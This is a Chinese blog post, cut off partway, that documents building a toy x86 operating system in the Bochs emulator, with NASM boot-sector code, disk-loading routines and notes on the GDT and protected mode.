    <content type="html"><![CDATA[<h1 id="0x0-写在一切之前"><a href="#0x0-写在一切之前" class="headerlink" title="0x0:写在一切之前"></a>0x0:写在一切之前</h1><p>本来在笔者的计划中，手搓一个简易的操作系统是在暑假就该完成的事情，结果笔者是只懒🐶，而且当时一直在搞fuzz和iot<del>（但好像也没搞出什么东西来，只是单纯的在摸鱼罢了）</del>。</p><p>然后呢笔者最近想重开kernel，静下心来好好学点内核。但掐指一算好像还有两个星期就到期末周了，学个🐕8</p><p>👴当🐓立断不如看点书，参考一下《操作系统真象还原》，基础能打一点是一点。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="bochs安装"><a href="#bochs安装" class="headerlink" title="bochs安装"></a>bochs安装</h3><p><a href="https://sourceforge.net/projects/bochs/files/bochs/">Bochs x86 PC emulator - Browse &#x2F;bochs at SourceForge.net</a></p><p>找个版本下载并解压</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/your/path/yo/bochs</span> <span class="hljs-params">--enable-debugger</span> <span class="hljs-params">--enable-disasm</span> <span class="hljs-params">--enable-iodebug</span> <span class="hljs-params">--enable-x86-debugger</span> <span class="hljs-params">--with-x</span> <span class="hljs-params">--with-x11</span><br>$ make<br>$ make install<br></code></pre></td></tr></table></figure><p><code>bochs</code>支持自带的<code>debug</code>和<code>gdb</code>（编译的时候-<code>-enable-debugger</code>变成<code>--enable-gdb-stub</code>），但gdb这适配做的是一坨shit，建议直接用<code>bochs</code>自带的</p><p>配置文件，抄的A3👴的呜呜，把<code>share/doc/bochs/bochsrc-sample.txt</code>里的改一改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">megs: 32<br>romimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/BIOS-bochs-latest<br>vgaromimage: <span class="hljs-attribute">file</span>=./bochs/share/bochs/VGABIOS-lgpl-latest<br>ata0-master: <span class="hljs-attribute">type</span>=disk, <span class="hljs-attribute">mode</span>=flat, <span class="hljs-attribute">path</span>=<span class="hljs-string">&quot;img.img&quot;</span><br>cpu: <span class="hljs-attribute">model</span>=pentium, <span class="hljs-attribute">count</span>=1, <span class="hljs-attribute">ips</span>=50000000, <span class="hljs-attribute">reset_on_triple_fault</span>=1, <span class="hljs-attribute">ignore_bad_msrs</span>=1, <span class="hljs-attribute">msrs</span>=<span class="hljs-string">&quot;msrs.def&quot;</span><br><span class="hljs-comment"># following lines need to be added by yourself</span><br>keyboard: <span class="hljs-attribute">type</span>=mf, <span class="hljs-attribute">serial_delay</span>=250 <span class="hljs-attribute">keymap</span>=./bochs/share/bochs/keymaps/x11-pc-us.map<br><span class="hljs-comment">#sound: driver=default, waveout=/dev/dsp. wavein=, midiout= </span><br></code></pre></td></tr></table></figure><h3 id="bochs-调试"><a href="#bochs-调试" class="headerlink" title="bochs 调试"></a>bochs 调试</h3><p>大部分调试命令和gdb一样，有几个特殊的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> mode:每次 CPU 变换模式时就提示，模式是指保护模式、实模式，比如从实模式进入到保护模式时会有提示<br><br><span class="hljs-keyword">show</span> <span class="hljs-type">int</span>:每次有中断时就提示 p 同时显示三种中断类型，这 三 种中断类型包括“ softint ”、“ extint ”和“ iret ”。可以单独显示某类中断，如执行 <span class="hljs-keyword">show</span> softint 只显示软件主动触发的中断， <span class="hljs-keyword">show</span> extint 则只显示来自外部设备的中断， <span class="hljs-keyword">show</span> iret 只显示 iretd 指令有关的信息 <br><br>reg：常用寄存器的值<br><br><span class="hljs-keyword">info</span> gdt/ldt/CPU/idt/ivt：全局符号描述表/局部符号描述表/所有CPU寄存器的值/显示中断向量表IDT/显示中断向量表IVT<br><br>sreg：查看段寄存器的值<br>dreg：查看调试寄存器的值<br>creg：查看控制寄存器的值<br></code></pre></td></tr></table></figure><h3 id="pack-start"><a href="#pack-start" class="headerlink" title="pack &amp; start"></a>pack &amp; start</h3><p>pack.sh</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">!/bin/bash<br>nasm -o ./mbr.bin ./mbr.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin <span class="hljs-attribute">of</span>=./img.img <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>./bochs/bin/bochs -f ./bochsrc.disk<br></code></pre></td></tr></table></figure><h1 id="0x1-开始调教MBR（bushi）🥵"><a href="#0x1-开始调教MBR（bushi）🥵" class="headerlink" title="0x1:开始调教MBR（bushi）🥵"></a>0x1:开始调教MBR（bushi）🥵</h1><h2 id="about-BIOS"><a href="#about-BIOS" class="headerlink" title="about BIOS"></a>about BIOS</h2><p>众所周知，当你按下神圣的开机键，<code>CPU</code>通上电之后以实模式启动，第一个运行的程序便是<code>BIOS</code>，<code>BIOS</code>将<code>MBR</code>载入，将控制权交给了<code>MBR</code></p><p>于是便产生了玄学三问：<code>BIOS</code>是什么？他从哪来？为什么他先执行？</p><p>首先先看张《操作系统真象还原》里的图，关于实模式下的内存分布</p><p><img src="/img/OS/0.png" alt="img"></p><p><code>BIOS</code>：<code>Basic Input &amp; Output System</code>即基本输入输出系统，主要工作便是检测、初始化硬件，还建立了伟大的中断向量表</p><p>但是通过图可知，<code>BIOS</code>才<code>0xf0000-0xfffff</code>共计<code>64KB</code>大小，不可能兼顾到所有的硬件设备，而且此时运行在实模式下，也没有这个必要，所以只要挑一些重要的，能保证计算机运行的基本硬件IO操作就行了。此为<code>BIOS</code>名称由来</p><p>至于<code>BIOS</code>在哪里，这玩意一直在主板上的<code>ROM</code>里，通电的时候<code>ROM</code>就被映射在<code>0xf0000-0xfffff</code>,只要访问了这里就算访问了<code>BIOS</code>,这个映射完全是由硬件完成的。</p><p>But <code>BIOS</code>也算是个程序，所以也是有入口的，此处便是<code>0xffff0</code>。电脑开机的一瞬间，CPU的<code>cs:ip</code>寄存器被赋值为<code>0xf000</code>:<code>0xfff0</code>。然后开机时处于实模式，段基址<code>cs</code>要左移四位，所以此时<code>cs:ip</code>等效地址为<code>0xffff0</code>，为<code>BIOS</code>入口。</p><p>但是<code>0xffff0-0xfffff</code>这短短的16字节显然并不能干什么，通过调试发现，<code>0xffff0</code>处的指令实为跳转指令，跳到<code>0xfe05b</code>处。这才是<code>BIOS</code>真正开始的地方</p><p><img src="/img/OS/1.png" alt="img"></p><p>当初始化硬件和建立中断向量表后，<code>BIOS</code>将自己最后的波纹用于检查0盘0道1扇区（实则是0盘0道0扇区，CHS表示方式中1扇区就是第一个扇区）最后两个字节是否为<code>magic number</code> <strong>0x55</strong>和<strong>0xaa</strong>（你问👴为什么不是114514这种恶臭的杂修~，👴知道个der，反正书里写了）。如果是，就会把这个扇区的<code>data</code>加载到<code>0x7c00</code>,随后跳转执行。此处执行的，便是MBR。如果你问完<code>magic number</code>又要问👴为什么是<code>0x7c00</code>,👴只能说是<code>IBM生产的PC5150的ROM BIOS 中的INT19H</code>的历史遗留问题，当时的<code>BIOS</code>按<code>32KB</code>的大小来设计，<code>32KB</code>就是<code>0x8000</code>，<code>MBR</code>的大小是512字节，同时作为一个程序需要使用栈，姑且算<code>1KB</code>好了。<code>1KB</code>是多少，<code>0x400</code>，所以<code>0x8000</code> - <code>0x400</code>是<code>0x7c00</code>。</p><h2 id="MBRの初次调教"><a href="#MBRの初次调教" class="headerlink" title="MBRの初次调教"></a>MBRの初次调教</h2><p>写了这么多终于到<code>MBR</code>了，妈妈生的</p><p><code>MBR（Master Boot Recode）</code>——主引导记录，是我们能最早支配的程序，因为<code>BIOS</code>这byd是写死的。</p><p>需要注意的是，MBR的大小必须是512字节，因为只有这样才能保证0道0盘1扇区的最后两个字节为<code>magic</code>。</p><p>先写一个在屏幕上输出字符的<code>MBR</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00    ;因为MBR被加载到0x7c00，所以将整个code作为section，并将vstart赋值0x7c00，这样计算绝对地址时就会以0x7c00为base<br>mov ax,cs                ;段寄存器不能用立即数，只能通过寄存器或者内存进行赋值<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600             ;上卷全部行，清屏<br>mov bx,0x700<br>mov cx,0                 ;左上角（0，0）<br>mov dx,0x184f          ;右下角（80，25）<br>int 0x10                 ;BIOS提供的0x10中断<br><br> mov ah,3                 ;获取光标位置<br>mov bh,0<br>int 0x10<br><br>mov ax,message           ;es:bp是字符串地址，因为前面es已经被初始化，所以cs=es<br>mov bp,ax<br><br>mov cx,0x20              ;length <br>mov ax,0x1301            ;ah:01 显示字符串，光标跟随移动<br>mov bx,0x2               ;bl:02 黑底绿字<br>int 0x10 <br><br>jmp $                    ;$表示当前行，程序在这边卡住<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0    ;$$表示section的位置，填充510的length，补上magic number<br>db 0x55,0xaa   <br></code></pre></td></tr></table></figure><p>运行后可以康康</p><p><img src="/img/OS/2.png" alt="img"></p><p>输出的时候写了个循环，优化一下，不用算length了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov ax,message<br>mov bp,ax<br><br>.korey_print:<br><br> mov ah,3<br>mov bh,0<br>int 0x10<br><br>mov cx,1<br>mov ax,0x1301<br>mov bx,0x2<br>int 0x10<br>        <br>    inc bp<br>    mov ax,[bp]<br>    test ax,ax<br>    jnz .korey_print<br>       <br>jmp $<br><br>message db &quot;The First MBR of Korey0sh1&quot;<br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><h2 id="变成显存形状的MBR"><a href="#变成显存形状的MBR" class="headerlink" title="变成显存形状的MBR"></a>变成显存形状的MBR</h2><p>前面的<code>MBR</code>，使用<code>BIOS</code>提供的0x10中断完成了字符输出，说实话还是依赖于中断向量表。</p><p>But，中断向量表只存在于实模式，以后还是要进入保护模式的捏，但保护模式就莫得中断向量表了，也就无法使用int 0x10来完成输出了。</p><p>那该怎么办捏</p><p>答案就是直接对显卡上手。</p><p>显卡显卡，就是用来图像输出的卡。而显卡中的显存，是显卡提供给我们的接口。关于实模式的内存分布中提到<code>0xA0000</code>-<code>0xC7FFF</code>是显存的区域，事实上，当你直接在显存上写东西。显卡便会在屏幕上输出内容</p><p><img src="/img/OS/3.png" alt="img"></p><p>下面是在显存文本模式区域（一个字节表示输出字符，一个字符表示其属性）输出<code>“korey&quot;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SECTION MBR vstart=0x7c00<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;k&#x27;<br>mov byte [gs:0x01],0xa4   ;A：背景色绿色   4：前景色红色<br><br>mov byte [gs:0x02],&#x27;o&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;r&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;e&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;y&#x27;<br>mov byte [gs:0x09],0xa4<br><br>jmp $<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p><img src="/img/OS/4.png" alt="img"></p><h2 id="MBR-和我交往吧，磁盘仙贝！😋"><a href="#MBR-和我交往吧，磁盘仙贝！😋" class="headerlink" title="MBR:和我交往吧，磁盘仙贝！😋"></a>MBR:和我交往吧，磁盘仙贝！😋</h2><p><code>BIOS</code>只能把0柱面0磁道1扇区512字节大小的<code>MBR</code>载入内存，那么问题来了，<code>MBR</code>执行完了，然后干什么嘞。</p><p>其实我们都知道，<code>MBR</code>也不过是一个中继程序而已，然既然<code>MBR</code>是从磁盘导入的，那我们能不能用<code>MBR</code>从磁盘导入别的<code>data</code>呢？</p><p>这就涉及到磁盘通信问题惹</p><p>先贴一张表，出自《操作系统真象还原》</p><p><img src="/img/OS/5.png" alt="img"></p><p>先来看看一些常用的端口</p><ul><li>data <code>0x1f0/0x170</code>：负责管理数据，唯一一个16位的</li><li>error&#x2F;feature <code>0x1f1/0x171</code>：读取硬盘失败时记录失败信息&#x2F;写入硬盘时存储命令需要的额外参数</li><li>Sector count <code>0x1f2/0x172</code>：指定待写入或待读取的扇区</li><li>device <code>0x1f6/0x176</code>：杂项寄存器，什么功能都带点。图来自《操作系统真象还原》</li><li><img src="/img/OS/6.png" alt="img"></li><li>status （读硬盘时）<code>0x17f/0x177</code>：状态寄存器。图来自《操作系统真象还原》</li><li><img src="/img/OS/7.png" alt="img"></li><li>command（写硬盘时）<code>0x17f/0x177</code>：储存让硬盘执行的命令。常用的就三个</li><li>identify: 0xEC 硬盘识别<br>read sector: 0x20 读取扇区<br>write sector: 0x30 写入扇区</li></ul><p>在物理层面上，硬盘内寻址是通过”柱面．磁头．扇区”来定位的<code>Cylinder Head Sector</code>，简称为 <code>CHS</code> ，这对读写的磁头很形象，但对于可爱的<code>MBR</code>小姐就太抽象了。于是出现了<code>LBA</code>，逻辑块地址<code>（logic block address）</code>，不考虑扇区所在的物理结构。</p><p>LBA又分LBA28（最大支持128G）和LBA48（最大支持128PB），我们这边就讨论LBA28</p><p>所以三个8位的寄存器存放<code>LBA28</code>的低24位，高4位存放在<code>device</code>寄存器的低4位</p><p>在<code>x86</code>架构中，与<code>IO</code>设备通信时一般会用<code>in/out</code>这两个指令，从端口读出数据或者向端口写入数据。并且默认<code>dx</code>寄存器存储端口号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dx,0x1f0<br>in dx,al         ;这样就是向0x1f0端口写入al的值了<br></code></pre></td></tr></table></figure><p>至于如何从磁盘读入数据写入内存的大致步骤笔者就不赘述了，可以参考书籍</p><p>下面就是代码罢了</p><p>boot.inc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs assembly">LOADER_BASE_ADDR equ 0x900            ;0x500-0x7bff都是可用区域<br>LOADER_START_SECTOR equ 0x2           ;扇区2<br>%include &quot;boot.inc&quot;<br>SECTION MBR vstart=0x7c00<br>mov ax,cs                         ;initial<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov fs,ax<br>mov sp,0x7c00<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600                      ;通过上卷清空屏幕<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov eax,LOADER_START_SECTOR       ;eax = 2<br>mov bx,LOADER_BASE_ADDR           ;bx = 0x900<br>mov cx,1                          ;待读取扇区数 = 1<br>call rd_disk_m_16<br><br>jmp LOADER_BASE_ADDR<br><br>rd_disk_m_16:<br>mov esi,eax                       ;保存参数<br>mov di,cx<br> <br>mov dx,0x1f2                      <br>mov al,cl         <br>out dx,al                         ;传个sector count 待读取扇区数为1<br><br>mov eax,esi<br><br>mov dx,0x1f3<br>out dx,al                         ;LAB low<br><br>mov cl,8<br>shr eax,cl<br>mov dx,0x1f4<br>out dx,al                         ;LAB mid<br>    <br>    shr eax,cl                        <br>    mov dx,0x1f5<br>    out dx,al                         ;LAB high<br>    <br>shr eax,cl<br>and al,0x0f<br>or al,0xe0<br>mov dx,0x1f6<br>out dx,al                         ;lba 第 24-27位。设置 7-4 位为 1110 ，表示 lba 模式            <br><br>mov dx,0x1f7<br>mov al,0x20<br>out dx,al                         ;写入读取命令<br><br>.not_ready:                           ;还是0x1f7端口<br>nop<br>in al,dx<br>and al,0x88                       ;第 4 位为 1 表示硬盘控制器已准备好数据传输  第 7 位为 1 表示硬盘忙<br>cmp al,0x08 <br>jnz .not_ready                    ;直到准备好为止<br><br>mov ax,di                         <br>mov dx,256<br>mul dx<br>mov cx,ax                         ;di 为要读取的扇区数，一个扇区有512字节每次读入一个字116共需 di*512/2次，所以 di*<br>mov dx,0x1f0                      <br><br>.go_on_read:<br>in ax,dx<br>mov [bx],ax<br>add bx,2<br>loop .go_on_read<br>ret<br><br> times 510-($-$$) db 0<br>db 0x55,0xaa<br></code></pre></td></tr></table></figure><p>当然此时扇区2里面一点数据都没有，我们可以随便写一点loader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs assembly">%include &quot;boot.inc&quot;<br>SECTION LOADER vstart=LOADER_BASE_ADDR<br>mov ax,cs<br>mov ds,ax<br>mov es,ax<br>mov ss,ax<br>mov sp,LOADER_BASE_ADDR<br>mov ax,0xb800<br>mov gs,ax<br><br>mov ax,0x600<br>mov bx,0x700<br>mov cx,0<br>mov dx,0x184f<br>int 0x10<br><br>mov byte [gs:0x00],&#x27;L&#x27;<br>mov byte [gs:0x01],0xa4  <br><br>mov byte [gs:0x02],&#x27;O&#x27;<br>mov byte [gs:0x03],0xa4<br><br>mov byte [gs:0x04],&#x27;A&#x27;<br>mov byte [gs:0x05],0xa4<br><br>mov byte [gs:0x06],&#x27;D&#x27;<br>mov byte [gs:0x07],0xa4<br><br>mov byte [gs:0x08],&#x27;E&#x27;<br>mov byte [gs:0x09],0xa4<br><br>mov byte [gs:0x0a],&#x27;R&#x27;<br>mov byte [gs:0x0b],0xa4<br><br>jmp $<br></code></pre></td></tr></table></figure><p>编译后dd进磁盘的扇区2，所以pack.h也得改一改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/bin/bash</span><br>nasm -o ./mbr.bin ./mbr.S<br>nasm -o ./loader.bin ./load.S<br>./bochs/bin/bximage <span class="hljs-attribute">-mode</span>=create <span class="hljs-attribute">-hd</span>=60M <span class="hljs-attribute">-imgmode</span>=<span class="hljs-string">&quot;flat&quot;</span> -q ./img.img<br>dd <span class="hljs-attribute">if</span>=./mbr.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">conv</span>=notrunc<br>dd <span class="hljs-attribute">if</span>=./loader.bin \<br>        <span class="hljs-attribute">of</span>=./img.img \<br>        <span class="hljs-attribute">bs</span>=512 <span class="hljs-attribute">count</span>=1 <span class="hljs-attribute">seek</span>=2 <span class="hljs-attribute">conv</span>=notrunc<br></code></pre></td></tr></table></figure><p>然后就可以愉快的跳到0x900执行loader了</p><p><img src="/img/OS/8.png" alt="img"></p><p>但是这个loader并没有任何意义，因为他是在实模式下运行的，只是为了测试MBR的功能性。</p><h1 id="0x2-保护模式"><a href="#0x2-保护模式" class="headerlink" title="0x2:保护模式"></a>0x2:保护模式</h1><h2 id="段描述符（Segment-Descriptor）"><a href="#段描述符（Segment-Descriptor）" class="headerlink" title="段描述符（Segment Descriptor）"></a>段描述符（Segment Descriptor）</h2><p>随着时间的推移，8086进化成了80386，地址总线也从16位变成32位，but，段寄存器却还是16位从未变过</p><p>这是因为关于段的信息被存放在了内存中一块叫做<strong>段描述符</strong>的地方</p><p><img src="/img/OS/9.png" alt="img"></p><p>段描述符长8字节，64位，里面的各个位的具体含义如下</p><ul><li>0-15：段界限低16位</li><li>16-31：段基址低16位</li><li>32-39：段基址中8位</li><li>40-43：type 指定本描述符的类型，用于表示内存段和门的子类型。图出自《操作系统真象还原》</li><li><img src="/img/OS/10.png" alt="img"></li><li>44：S 0&#x2F;1 —&gt; 系统段&#x2F;数据段</li><li>45-46：DPL ，即<code>Descriptor Privilege Level</code>，描述符特权级，分0、1、2、3，数字越小，特权级越大</li><li>47：P <code>Present</code>，即段是否存在 0&#x2F;1 —&gt; 不存在&#x2F;存在</li><li>48-51：段界限高4位</li><li>52：AVL，即<code>AVaiLable</code>，可用的</li><li>53：L，是否为64位代码段 0&#x2F;1 —&gt; 否&#x2F;是</li><li>54：D&#x2F;B，表示有效地址（段内偏移地址）和操作数大小 0&#x2F;1 —&gt; 16位&#x2F;32位</li><li>55：G，粒度 0&#x2F;1 —&gt; 1B&#x2F; 4KB</li><li>56-63：段基址高8位</li></ul><p>你要问👴为什么段界限和段基址会被拆成这个JB样子，👴只能说兼容、兼容、还是牛魔的兼容</p><h2 id="全局描述符表GDT（Global-Descriptor-Table）"><a href="#全局描述符表GDT（Global-Descriptor-Table）" class="headerlink" title="全局描述符表GDT（Global Descriptor Table）"></a>全局描述符表GDT（Global Descriptor Table）</h2><p>一个段描述符只能描述一段内存，but内存被分成许多段是无法避免的，所以这时候全局描述符表就出现了，一个内存中专门用来存放段描述符的地方。</p><p>程序都可以在GDT中定义自己的段描述符，CPU通过一个专门指向GDT的寄存器<code>GDTR</code>和一个“下标”，也就是<code>selector</code>选择子，在GDT中精准的找到自己需要的段描述符</p><h3 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h3><p>48位寄存器，专门用来存储GDT的内存地址和大小,下图出自《操作系统真象还原》</p><p><img src="/img/OS/11.png" alt="img"></p><p>前16位是界限值，2^16 &#x3D; 65536，所以前16位的<code>max value</code> &#x3D; 65536 -1 &#x3D; 0xffff</p><p><code>and</code>一个段描述符长8字节，所以一个<code>GDT</code>最多存储8192个段描述符</p><p><strong>lgdt</strong>:对GDTR特攻指令，具体操作为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">lgdt 48位内存数据<br></code></pre></td></tr></table></figure><h3 id="selector"><a href="#selector" class="headerlink" title="selector"></a>selector</h3><p>选择子是16位，下图出自《操作系统真象还原》</p><p><img src="/img/OS/12.png" alt="img"></p><p>0-1位：RPL，请求特权级，00为0，11为3</p><p>2位：TI，即<code>Table Indicator</code>，0为<code>GDT</code>中索引描述符，1为<code>LDT</code>（有全局当然也会有局部，<code>Local Descriptor Table</code>，局部描述符表）中索引描述表</p><p>高13位是索引值，2^13 &#x3D; 8192，即最多能有8192个段描述符，和上文相符</p><p><strong>PS：GDT中第0个索引值不可用，因为selector未初始化时为0</strong></p><p>至于<code>LDT</code>，和<code>GD</code>T类似，就不再赘述</p><h2 id="打开A20地址线"><a href="#打开A20地址线" class="headerlink" title="打开A20地址线"></a>打开A20地址线</h2><p>先来说说8086的地址回绕</p><h3 id="8086地址回绕"><a href="#8086地址回绕" class="headerlink" title="8086地址回绕"></a>8086地址回绕</h3><p>8086的地址总线是20位的，所以有A0-A19这20根地址线</p><p>在实模式下，采用段基址*16+偏移的寻址方式，不难发现，当0xffff：0xffff时，此时的逻辑地址是0x10ffef，但是，20位地址总线的最大值是0xfffff，在逻辑上这是正确的，但在物理内存中没有相应的地址。为了避免这个bug，所以8086采取的策略便是将逻辑地址对0x100000取模，这就是8086的地址回绕</p><h3 id="A20GATE"><a href="#A20GATE" class="headerlink" 